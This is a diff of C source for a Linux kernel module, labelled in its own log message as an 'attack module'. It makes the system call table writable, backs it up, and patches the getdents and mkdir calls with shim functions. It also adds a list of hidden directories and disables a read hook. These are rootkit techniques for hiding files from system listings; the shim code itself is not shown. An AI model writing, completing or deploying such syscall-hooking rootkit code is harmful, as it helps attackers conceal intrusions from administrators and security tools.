@@ -2,6 +2,7 @@
 #include "rw.h"
 #include "syscall.h"
 #include "utility.h"
+#include "hiddenDirectories.h"
 
 //new system calls
 #include "getdentsShim.h"
@@ -12,6 +13,7 @@
 MODULE_LICENSE("GPL");
 
 syscall backup_sys_call_table[SYS_TABLE_LENGTH];
+vector hiddenDirectories;
 
 void patch(int callnum, void* newcall) {
 	sys_call_table[callnum] = (syscall)newcall;
@@ -24,6 +26,7 @@ void unpatch(int callnum) {
 int init_module() {
 	int bootresult;
 	printk(KERN_INFO "Attempting to initialize attack module.\n");
+	hiddenDirectories = vector_init();
 	make_rw(sys_call_table);
 	//make a backup of the system call table
 	memcpy(backup_sys_call_table, sys_call_table, sizeof(backup_sys_call_table));
@@ -34,7 +37,7 @@ int init_module() {
 
 	//shim the syscalls. 
 	patch(SYS_getdents, getdentsShim);
-	patch(SYS_read, readShim);
+	//patch(SYS_read, readShim);
 	patch(SYS_mkdir, mkdirShim);
 
 	printk(KERN_INFO "Module loaded\n");
